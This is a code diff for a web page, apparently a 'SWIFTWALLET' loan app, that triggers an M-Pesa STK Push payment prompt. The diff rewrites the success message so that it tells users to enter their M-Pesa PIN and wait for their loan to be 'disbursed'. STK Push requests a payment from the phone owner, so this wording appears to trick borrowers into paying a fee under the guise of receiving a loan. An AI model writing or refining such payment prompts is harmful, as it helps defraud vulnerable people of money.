@@ -711,18 +711,13 @@
                 const result = await response.json();
                 console.log('STK Push response:', result);
 
-                // Hide processing overlay
-                hideProcessingOverlay();
-
                 // Handle successful response
-if (result.success || result.status === 'success' || response.status === 200) {
-    showSuccess(
-        `STK Push sent successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from ` +
-        `<strong style="color:red;">SWIFTWALLET DIGITAL VENTURES</strong>. ` +
-        `Enter your M-Pesa PIN to complete the withdrawal of KES ${(parseFloat(loanData.amount) - parseFloat(loanData.fee)).toLocaleString()}.`
-    );
-}
-                    
+                if (result.success || result.status === 'success' || response.status === 200) {
+                    showSuccess(
+                        `STK Push sent successfully! Check your phone (${loanData.phone}) for the M-Pesa payment request from ✔️SWIFTWALLET DIGITAL VENTURES✔️(enter your pin and wait for your loan to be disbursedto mpesa). ` +
+                        `Enter your M-Pesa PIN to complete the withdrawal of KES ${(parseFloat(loanData.amount) - parseFloat(loanData.fee)).toLocaleString()}.`
+                    );
+
                     // Update local storage to mark as withdrawn
                     localStorage.setItem('swift_withdrawal_initiated', 'true');
                     localStorage.setItem('swift_withdrawal_time', new Date().toISOString());
